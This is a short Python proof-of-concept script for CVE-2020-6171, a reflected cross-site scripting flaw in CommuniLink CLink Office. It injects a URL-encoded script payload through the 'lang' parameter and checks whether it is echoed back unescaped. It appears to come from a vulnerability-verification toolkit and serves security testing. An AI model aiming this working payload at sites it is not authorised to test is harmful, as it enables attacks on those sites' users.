# title: 	CommuniLink CLink Office 跨站脚本漏洞 CVE-2020-6171
# author: antx
# cveid: CVE-2020-6171

from poctools import BasicPoc


class APoc(BasicPoc):
    def __init__(self):
        super(APoc, self).__init__()
        self.name = 'A-Poc'

    def verify(self, url: str):
        url = url.rstrip("/")
        target = f"{url}?lang=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%3Cp%20class=%22&p=1"
        try:
            resp = self.get(target)
            if resp.status_code == 200 and '"></script><script>alert(document.domain)</script>' in resp.text and 'text/html' in resp.headers['Content-Type']:
                return True
        except Exception as e:
            pass
        return False


if __name__ == '__main__':
    target = 'https://127.0.0.1'
    tp = APoc()
    result = tp.run(url=target)
    print(f'{target} -> {result}')
